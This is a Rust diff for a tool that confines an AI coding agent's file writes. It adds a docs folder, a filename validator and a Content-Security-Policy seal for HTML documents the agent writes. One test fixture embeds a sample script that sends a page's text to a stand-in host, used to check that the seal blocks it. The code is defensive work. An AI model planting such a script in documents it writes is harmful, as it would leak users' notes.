@@ -19,18 +19,39 @@ pub(crate) fn ensure() -> Result<PathBuf, String> {
     if !mem.exists() {
         fs::write(&mem, MEMORY_SEED).map_err(|e| e.to_string())?;
     }
+    fs::create_dir_all(d.join("docs")).map_err(|e| e.to_string())?;
     fs::canonicalize(&d).map_err(|e| e.to_string())
 }
 
-/// The single write he is allowed. `Edit(…)` covers every file-editing tool — Claude Code
-/// ignores `Write(…)` rules — and `//` makes the path absolute; one `/` would be relative
-/// to this settings file and silently deny everything.
+/// The writes he is allowed: his memory, and the documents he writes when asked for one.
+/// `Edit(…)` covers every file-editing tool — Claude Code ignores `Write(…)` rules — and
+/// `//` makes the path absolute; one `/` would be relative to this settings file and
+/// silently deny everything.
 pub(crate) fn settings_json(resolved_dir: &Path) -> Value {
     let mem = resolved_dir.join("memory.md");
+    let docs = resolved_dir.join("docs");
     json!({ "permissions": {
-        "allow": [format!("Edit(/{})", mem.to_string_lossy())],
+        "allow": [format!("Edit(/{})", mem.to_string_lossy()), format!("Edit(/{}/**)", docs.to_string_lossy())],
         "deny": SECRET_READS,
     } })
+}
+
+/// A document he may name: one plain `.md` or `.html` file directly in his docs folder.
+pub(crate) fn valid_doc_name(name: &str) -> bool {
+    let ext_ok = name.ends_with(".md") || name.ends_with(".html");
+    ext_ok
+        && !name.starts_with('.')
+        && name.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
+}
+
+/// The policy an HTML doc is opened under: no script, no request of any kind, inline style
+/// and embedded images only. Browsers enforce every policy a page carries, so one placed
+/// first holds whatever the document declares after it.
+const DOC_CSP: &str = "default-src 'none'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'";
+
+/// The HTML he wrote, preceded by that policy.
+pub(crate) fn sealed_html(html: &str) -> String {
+    format!("<meta http-equiv=\"Content-Security-Policy\" content=\"{DOC_CSP}\">\n{html}")
 }
 
 /// Files he must not read even inside a folder he may: a category folder can hold whole
@@ -208,9 +229,34 @@ mod tests {
     use serde_json::json;
 
     #[test]
-    fn settings_allow_exactly_one_edit_on_memory_with_a_double_slash_path() {
+    fn settings_allow_edits_on_his_memory_and_his_docs_only() {
         let s = settings_json(Path::new("/private/tmp/x/brutus"));
-        assert_eq!(s["permissions"]["allow"], json!(["Edit(//private/tmp/x/brutus/memory.md)"]));
+        assert_eq!(s["permissions"]["allow"], json!([
+            "Edit(//private/tmp/x/brutus/memory.md)",
+            "Edit(//private/tmp/x/brutus/docs/**)",
+        ]));
+    }
+
+    #[test]
+    fn a_doc_name_is_one_plain_file_in_his_docs_folder() {
+        for ok in ["brief.md", "perf-dossier.html", "GOSDK-1_notes.v2.md"] {
+            assert!(valid_doc_name(ok), "{ok}");
+        }
+        for bad in ["../memory.md", "a/b.md", ".hidden.md", "x.sh", "x.htm", "", "x.md\n", "x .md"] {
+            assert!(!valid_doc_name(bad), "{bad:?}");
+        }
+    }
+
+    // A doc is written from notes that other people and sessions wrote, so its HTML may
+    // carry a script that sends them somewhere. The copy that is opened forbids every
+    // script and every request, whatever the file itself declares.
+    #[test]
+    fn an_html_doc_opens_sealed_against_scripts_and_requests() {
+        let sealed = sealed_html("<html><head><script>fetch('https://x.example/?'+document.body.innerText)</script></head><body>hi</body></html>");
+        let csp = sealed.split('\n').next().unwrap();
+        assert!(csp.starts_with("<meta http-equiv=\"Content-Security-Policy\""), "{csp}");
+        assert!(csp.contains("default-src 'none'") && !csp.contains("script-src") && csp.contains("connect-src 'none'"));
+        assert!(sealed.ends_with("</html>"), "the document itself is kept as written");
     }
 
     // A category folder can hold whole repos, .env files included — the review found
